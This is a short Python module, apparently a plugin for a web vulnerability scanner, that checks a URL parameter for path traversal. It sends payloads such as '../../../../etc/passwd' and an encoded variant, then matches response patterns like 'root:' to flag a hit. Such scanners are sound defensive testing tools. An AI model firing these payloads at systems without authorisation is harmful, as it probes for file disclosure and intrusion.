from utils.requester import send_request

# -----------------------
# 🧠 META
# -----------------------

meta = {
    "name": "Path Traversal",
    "severity": "High",
    "description": "Detects directory traversal vulnerabilities"
}

inputs = ["param"]


# -----------------------
# 🚀 SCAN
# -----------------------

def scan(url, param):
    payloads = [
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../../../etc/passwd",
        "..%2F..%2F..%2Fetc%2Fpasswd"
    ]

    try:
        for payload in payloads:
            test_url = f"{url}?{param}={payload}"
            response = send_request(test_url)

            # 🔥 detection patterns
            if any(x in response for x in ["root:", "daemon:", "[extensions]", "boot loader"]):
                return {
                    "vulnerable": True,
                    "result": f"Path traversal detected using payload: {payload}",
                    "severity": "High"
                }

        return {
            "vulnerable": False,
            "result": "No path traversal detected",
            "severity": "Low"
        }

    except Exception as e:
        return {
            "vulnerable": False,
            "result": f"Error: {str(e)}",
            "severity": "Low"
        }